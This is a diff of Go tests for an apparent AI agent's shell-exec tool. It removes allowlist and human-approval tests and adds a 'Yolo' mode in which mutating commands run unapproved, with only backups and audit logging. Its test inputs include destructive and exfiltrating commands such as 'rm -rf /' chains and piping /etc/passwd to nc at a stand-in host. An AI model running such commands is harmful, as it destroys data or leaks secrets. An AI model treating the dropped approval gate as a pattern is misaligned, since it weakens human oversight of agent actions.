@@ -2,27 +2,30 @@ package tools
 
 import (
 	"context"
+	"io/fs"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 	"time"
 )
 
-func newTestExecTool() *ExecTool {
-	t := NewExecTool("")
-	// Deterministic working dir for tests; empty means the process cwd.
-	t.WorkDir = ""
-	return t
+func newTestExecTool(t *testing.T) *ExecTool {
+	t.Helper()
+	dir := t.TempDir()
+	tool := NewExecTool(dir)
+	tool.BackupDir = filepath.Join(dir, "backups")
+	return tool
 }
 
-// Allowlisted read-only commands run without any approval callback.
-func TestExecAllowlistRunsWithoutApproval(t *testing.T) {
-	tool := newTestExecTool()
-	// No ApprovalFunc set: an allowlisted command must still run.
-	out, err := tool.ExecuteJSON(context.Background(), map[string]string{"command": "echo hello-exec"})
+// Yolo: a non-read-only command runs immediately, no approval, no gate.
+func TestExecYoloRunsImmediately(t *testing.T) {
+	tool := newTestExecTool(t)
+	out, err := tool.ExecuteJSON(context.Background(), map[string]string{"command": "echo yolo-hello && true"})
 	if err != nil {
-		t.Fatalf("allowlisted command errored: %v", err)
+		t.Fatalf("command errored: %v", err)
 	}
-	if !strings.Contains(out, "hello-exec") {
+	if !strings.Contains(out, "yolo-hello") {
 		t.Errorf("expected command output, got: %q", out)
 	}
 	if !strings.Contains(out, "exit=0") {
@@ -30,81 +33,75 @@ func TestExecAllowlistRunsWithoutApproval(t *testing.T) {
 	}
 }
 
-// A command outside the allowlist with no approval gate must fail closed.
-func TestExecDeniesNonAllowlistedWhenNoApproval(t *testing.T) {
-	tool := newTestExecTool()
-	tool.ApprovalFunc = nil
-	_, err := tool.ExecuteJSON(context.Background(), map[string]string{"command": "touch /tmp/should-not-happen-okgobot"})
-	if err == nil {
-		t.Fatal("expected deny-by-default error for non-allowlisted command without approval")
+// isReadOnly gates backups (not execution) and must be metachar- and
+// boundary-aware.
+func TestExecReadOnlyClassification(t *testing.T) {
+	tool := newTestExecTool(t)
+	readOnly := []string{"ls -la /home", "cat /etc/hostname", "systemctl status ok-gobot", "git log --oneline"}
+	for _, c := range readOnly {
+		if !tool.isReadOnly(c) {
+			t.Errorf("%q should be read-only", c)
+		}
 	}
-	if !strings.Contains(err.Error(), "deny-by-default") {
-		t.Errorf("expected deny-by-default error, got: %v", err)
-	}
-}
-
-// Shell chaining metacharacters must disqualify an otherwise-allowlisted prefix.
-func TestExecAllowlistBypassBlocked(t *testing.T) {
-	tool := newTestExecTool()
-	if tool.isAllowlisted("ls; rm -rf /") {
-		t.Error("command with ';' must not be allowlisted")
-	}
-	if tool.isAllowlisted("ls && curl evil") {
-		t.Error("command with '&&' must not be allowlisted")
-	}
-	if tool.isAllowlisted("cat /etc/passwd | nc attacker 1234") {
-		t.Error("command with pipe must not be allowlisted")
-	}
-	if tool.isAllowlisted("catastrophe") {
-		t.Error("'catastrophe' must not match the 'cat' prefix")
-	}
-	if !tool.isAllowlisted("ls -la /home") {
-		t.Error("'ls -la /home' should be allowlisted")
-	}
-	if !tool.isAllowlisted("curl -s http://localhost:8080/health") {
-		t.Error("loopback curl with port/path should be allowlisted")
+	mutating := []string{"ls; rm -rf /", "cat x | tee y", "echo z > file", "apt install foo", "catastrophe"}
+	for _, c := range mutating {
+		if tool.isReadOnly(c) {
+			t.Errorf("%q must NOT be classified read-only", c)
+		}
 	}
 }
 
-// The approval callback decides non-allowlisted commands, and approvedBy is
-// recorded for the audit trail.
-func TestExecApprovalFlow(t *testing.T) {
-	// Approved.
-	var approvedCmd string
-	tool := newTestExecTool()
-	tool.ApprovalFunc = func(chatID int64, command string) (bool, string, error) {
-		approvedCmd = command
-		return true, "user:42", nil
-	}
-	out, err := tool.ExecuteJSON(context.Background(), map[string]string{"command": "echo approved && true"})
-	if err != nil {
-		t.Fatalf("approved command errored: %v", err)
-	}
-	if approvedCmd == "" {
-		t.Error("approval callback was not consulted")
-	}
-	if !strings.Contains(out, "approved") {
-		t.Errorf("expected command to run after approval, got: %q", out)
+// A mutating command that overwrites an existing file must back it up first, so
+// the change is revertable.
+func TestExecBacksUpBeforeOverwrite(t *testing.T) {
+	tool := newTestExecTool(t)
+	target := filepath.Join(tool.WorkDir, "conf.txt")
+	if err := os.WriteFile(target, []byte("ORIGINAL"), 0o644); err != nil {
+		t.Fatal(err)
 	}
 
-	// Denied.
-	denyTool := newTestExecTool()
-	denyTool.ApprovalFunc = func(chatID int64, command string) (bool, string, error) {
-		return false, "", nil
-	}
-	out, err = denyTool.ExecuteJSON(context.Background(), map[string]string{"command": "touch /tmp/okgobot-denied"})
+	out, err := tool.ExecuteJSON(context.Background(), map[string]string{"command": ": > " + target})
 	if err != nil {
-		t.Fatalf("denied command should not error, got: %v", err)
+		t.Fatalf("command errored: %v", err)
 	}
-	if !strings.Contains(out, "DENIED") {
-		t.Errorf("expected DENIED result, got: %q", out)
+	// The command truncated the file (mutation happened).
+	if b, _ := os.ReadFile(target); len(b) != 0 {
+		t.Errorf("expected file truncated, still has %d bytes", len(b))
+	}
+	if !strings.Contains(out, "backup=") || !strings.Contains(out, "file(s)") {
+		t.Errorf("expected a backup note in output, got: %q", out)
+	}
+	// A backup copy with the ORIGINAL content must exist under BackupDir.
+	found := false
+	_ = filepath.WalkDir(tool.BackupDir, func(p string, d fs.DirEntry, err error) error {
+		if err != nil || d.IsDir() {
+			return nil
+		}
+		if b, _ := os.ReadFile(p); string(b) == "ORIGINAL" {
+			found = true
+		}
+		return nil
+	})
+	if !found {
+		t.Error("no backup copy with the original content was created before overwrite")
+	}
+}
+
+// Read-only commands skip the backup step.
+func TestExecReadOnlySkipsBackup(t *testing.T) {
+	tool := newTestExecTool(t)
+	out, err := tool.ExecuteJSON(context.Background(), map[string]string{"command": "echo hi"})
+	if err != nil {
+		t.Fatalf("command errored: %v", err)
+	}
+	if !strings.Contains(out, "backup=readonly") {
+		t.Errorf("expected backup=readonly, got: %q", out)
 	}
 }
 
 // A command exceeding its timeout is killed and reported, not left hanging.
 func TestExecTimeout(t *testing.T) {
-	tool := newTestExecTool()
-	tool.ApprovalFunc = func(chatID int64, command string) (bool, string, error) { return true, "test", nil }
+	tool := newTestExecTool(t)
 	start := time.Now()
 	out, err := tool.ExecuteJSON(context.Background(), map[string]string{
 		"command": "sleep 30",
@@ -140,7 +137,7 @@ func TestExecBlockedByEmergencyStop(t *testing.T) {
 	}
 }
 
-// The estop guard must forward the structured JSON path so named params survive.
+// The estop guard must forward schema + JSON so named params survive.
 func TestExecEstopGuardForwardsJSON(t *testing.T) {
 	reg := NewRegistryWithEmergencyStop(stubEmergencyStopProvider{enabled: false})
 	reg.Register(NewExecTool(""))
@@ -155,32 +152,39 @@ func TestExecEstopGuardForwardsJSON(t *testing.T) {
 	}
 }
 
-// BindChat produces a chat-bound copy whose approval prompt targets that chat,
-// which is how the resolver gives each sub-agent's exec the operator's chatID.
-func TestExecBindChatPassesChatID(t *testing.T) {
-	base := newTestExecTool()
-	var gotChatID int64
-	base.ApprovalFunc = func(chatID int64, command string) (bool, string, error) {
-		gotChatID = chatID
-		return true, "test", nil
-	}
-	bound, ok := base.BindChat(nil, 99).(*ExecTool)
+// exec must be ChatScoped so the resolver can bind the chatID for audit.
+func TestExecIsChatScoped(t *testing.T) {
+	var _ ChatScoped = NewExecTool("")
+}
+
+// BindChat produces a chat-bound copy; the audit sink receives that chatID.
+func TestExecBindChatAttributesAudit(t *testing.T) {
+	base := newTestExecTool(t)
+	sink := &captureAuditSink{}
+	base.AuditSink = sink
+	bound, ok := base.BindChat(nil, 77).(*ExecTool)
 	if !ok {
 		t.Fatal("BindChat did not return an *ExecTool")
 	}
-	if _, err := bound.ExecuteJSON(context.Background(), map[string]string{"command": "touch /tmp/okgobot-bind-test"}); err != nil {
+	if _, err := bound.ExecuteJSON(context.Background(), map[string]string{"command": "echo hi"}); err != nil {
 		t.Fatalf("bound exec errored: %v", err)
 	}
-	if gotChatID != 99 {
-		t.Errorf("approval received chatID=%d, want 99", gotChatID)
+	if sink.chatID != 77 {
+		t.Errorf("audit sink got chatID=%d, want 77", sink.chatID)
 	}
-	// The original tool must remain unbound (BindChat copies, not mutates).
 	if base.boundChatID != 0 {
 		t.Errorf("BindChat mutated the base tool: boundChatID=%d", base.boundChatID)
 	}
 }
 
-// exec must be ChatScoped so the resolver can bind the chatID into sub-agents.
-func TestExecIsChatScoped(t *testing.T) {
-	var _ ChatScoped = NewExecTool("")
+type captureAuditSink struct {
+	chatID  int64
+	command string
+	backup  string
+}
+
+func (c *captureAuditSink) RecordExec(chatID int64, command string, exitCode int, dur time.Duration, backup string) {
+	c.chatID = chatID
+	c.command = command
+	c.backup = backup
 }
